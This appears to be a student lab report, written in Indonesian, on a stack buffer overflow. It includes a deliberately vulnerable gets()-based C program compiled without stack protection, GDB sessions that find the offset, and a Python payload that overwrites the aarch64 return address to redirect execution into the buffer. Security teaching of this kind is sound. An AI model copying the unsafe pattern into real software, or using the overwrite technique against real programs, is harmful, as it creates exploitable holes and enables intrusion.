R2 — Buffer Overflow Attack

Nama: Xyz Frizy Firstyaji  
NRP: 5024221073


Tujuan

Memahami konsep buffer overflow, bagaimana overflow dapat terjadi pada stack,
serta bagaimana attacker dapat mengontrol alur eksekusi program dengan
menimpa return address.


Implementasi

Membuat file bof.c menggunakan strcpy/gets.

3.1 Program
#include <stdio.h>
#include <string.h>

void bof()
{
    char buffer[24];

    printf("Address of buffer: %p\n", buffer);

    // baca dari stdin (INI KUNCINYA)
    gets(buffer);

    printf("Buffer content: %s\n", buffer);
}

int main()
{
    bof();
    return 0;
}


3.2 Compile Program
ekji@joyy:~/bof-lab$ gcc -fno-stack-protector -z execstack -o bof bof.c
bof.c: In function \u2018bof\u2019:
bof.c:11:5: warning: implicit declaration of function \u2018gets\u2019; did you mean \u2018fgets\u2019? [-Wimplicit-function-declaration]
   11 |     gets(buffer);
      |     ^~~~
      |     fgets
/usr/bin/ld: /tmp/ccht06kY.o: in function `bof':
bof.c:(.text+0x20): warning: the `gets' function is dangerous and should not be used.

3.3 Normal Execution
ekji@joyy:~/bof-lab$ ./bof AAAA
Address of buffer: 0xffffd60bcfb8

3.4 Buffer Overflow
ekji@joyy:~/bof-lab$ python3 -c 'print("A"*100)' | ./bof
Address of buffer: 0xffffe6d73788
Buffer content: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bus error (core dumped)

Analisis:
Program crash ketika kapasitas buffer diinput melebihi batas yang telah diset

3.5 Analisi dengan GDB
Program dianalisis menggunakan GDB untuk melihat struktur stack dan register

ekji@joyy:~/bof-lab$ gdb bof
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04.2) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "aarch64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from bof...
(No debugging symbols found in bof)
(gdb) break bof
Breakpoint 1 at 0x7ec
(gdb) run AAAA
Starting program: /home/ekji/bof-lab/bof AAAA
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/aarch64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000aaaaaaaa07ec in bof ()
(gdb) info frame
Stack level 0, frame at 0xffffffffefe0:
 pc = 0xaaaaaaaa07ec in bof; saved pc = 0xaaaaaaaa0824
 called by frame at 0xffffffffeff0
 Arglist at 0xffffffffefb0, args: 
 Locals at 0xffffffffefb0, Previous frame's sp is 0xffffffffefe0
 Saved registers:
  x29 at 0xffffffffefb0, x30 at 0xffffffffefb8

3.6 Menemukan Offset
Menentukan posisi return address, dilakukan percobaan dengan payload khusus.
Payload yang digunakan:

ekji@joyy:~/bof-lab$ gdb bof
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04.2) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "aarch64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from bof...
(No debugging symbols found in bof)
(gdb) break bof
Breakpoint 1 at 0x7ec
(gdb) run < input
Starting program: /home/ekji/bof-lab/bof < input
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/aarch64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000aaaaaaaa07ec in bof ()
(gdb) continue
Continuing.
Address of buffer: 0xffffffffefd8
Buffer content: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd

Program received signal SIGILL, Illegal instruction.
0x0000ffffffffefb8 in ?? ()
(gdb) info registers
x0             0x0                 0
x1             0xfffff7ffdb58      281474842483544
x2             0x0                 0
x3             0x0                 0
x4             0xaaaaaaaa087b      187649984432251
x5             0xaaaaaaab22d7      187649984504535
x6             0xa                 10
x7             0x4141414141414141  4702111234474983745
x8             0x40                64
x9             0x4141414141414141  4702111234474983745
x10            0xa                 10
x11            0x4141414141414141  4702111234474983745
x12            0x4141414141414141  4702111234474983745
x13            0xffffffffefb84141  -273137343
x14            0x0                 0
x15            0x4343434343434343  4846791580151137091
x16            0x1                 1
x17            0xfffff7e50d80      281474840726912
x18            0x0                 0
x19            0xfffffffff178      281474976706936
x20            0x1                 1
x21            0xaaaaaaab0d90      187649984499088
x22            0xfffff7ffe040      281474842484800

3.7 Redirect Execution
Setelah mengetahui offset, langkah selanjutnya adalah mengarahkan eksekusi program ke buffer.
Alamat buffer diperoleh dari output program:
Address of buffer: 0xffffffffefd8

Program yang digunakan:
import sys

payload = b"A"*32
payload += b"\xb8\xef\xff\xff\xff\xff\x00\x00"
payload += b"C"*40

sys.stdout.buffer.write(payload)

Payload disimpan ke file:
python3 payload.py > input

Program dijalankan dengan input dari stdin:
cat input | ./bof

ekji@joyy:~/bof-lab$ python3 payload.py > input
ekji@joyy:~/bof-lab$ cat input | ./bof
Address of buffer: 0xffffce26bfe8
Buffer content: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd
Segmentation fault (core dumped)

3.8 Hasil Akhir
Program berhasil diarahkan untuk mengeksekusi alamat buffer.
Hal ini ditunjukkan oleh nilai program counter (PC) yang mendekati alamat buffer.

Crash dengan error SIGILL menunjukkan bahwa CPU mencoba mengeksekusi
data dalam buffer sebagai instruksi.

## Analisis

Buffer overflow terjadi karena tidak adanya pengecekan batas input.
Hal ini memungkinkan penyerang menimpa return address (x30).

Dengan mengontrol return address, penyerang dapat mengarahkan eksekusi program
ke lokasi tertentu, seperti buffer yang berisi shellcode.

Eksperimen menunjukkan bahwa:
- Offset ke return address berhasil ditemukan
- Return address berhasil ditimpa
- Program execution berhasil diarahkan ke buffer

## Kesimpulan

Buffer overflow merupakan celah keamanan serius yang memungkinkan attacker
mengontrol alur eksekusi program.

Dengan teknik yang tepat, attacker dapat:
- Menimpa return address
- Mengarahkan eksekusi ke buffer
- Menjalankan kode berbahaya
